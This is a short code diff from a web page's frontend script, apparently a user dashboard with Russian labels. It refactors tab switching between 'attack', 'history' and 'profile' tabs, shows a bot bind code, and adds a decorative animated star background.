+                document.getElementById('bindStatus').innerHTML = '<span style="color:#00ff00;">✅ Код сгенерирован! Отправьте боту: /bind ' + data.code + '</span>';
+            } else { document.getElementById('bindStatus').innerHTML = '<span style="color:#ff4444;">❌ Ошибка</span>'; }
+        } catch(e) { document.getElementById('bindStatus').innerHTML = '<span style="color:#ff4444;">❌ Ошибка соединения</span>'; }
     }
 
     function switchTab(tab) {
         document.querySelectorAll('.tab-content').forEach(t => t.classList.remove('active'));
         document.querySelectorAll('.tab-btn').forEach(t => t.classList.remove('active'));
-        if (tab === 'attack') {
-            document.getElementById('attackTab').classList.add('active');
-            document.querySelector('.tab-btn:first-child').classList.add('active');
-        } else if (tab === 'history') {
-            document.getElementById('historyTab').classList.add('active');
-            document.querySelectorAll('.tab-btn')[1].classList.add('active');
-            updateHistoryDisplay();
-        } else if (tab === 'profile') {
-            document.getElementById('profileTab').classList.add('active');
-            document.querySelectorAll('.tab-btn')[2].classList.add('active');
-            loadProfile();
+        document.getElementById(tab + 'Tab').classList.add('active');
+        event.target.classList.add('active');
+        if (tab === 'history') updateHistoryDisplay();
+        if (tab === 'profile') updateProfile();
+    }
+
+    function createStars() {
+        for (let i = 0; i < 80; i++) {
+            const star = document.createElement('div');
+            star.className = 'star ' + (Math.random() > 0.7 ? 'big' : (Math.random() > 0.4 ? 'medium' : 'small'));
+            star.style.width = Math.random() > 0.7 ? '2px' : '1px';
+            star.style.height = star.style.width;
+            star.style.left = Math.random() * 100 + '%';
+            star.style.top = Math.random() * 100 + '%';
+            star.style.animationDelay = Math.random() * 5 + 's';
+            document.getElementById('starField').appendChild(star);
         }
     }
 
+    createStars();
     checkAuthAndLoad();
-    setInterval(() => updateSubscriptionDisplay(), 60000);
+    setInterval(() => { if (document.getElementById('profileTab').classList.contains('active')) updateProfile(); }, 60000);
 </script>
 </body>
 </html>
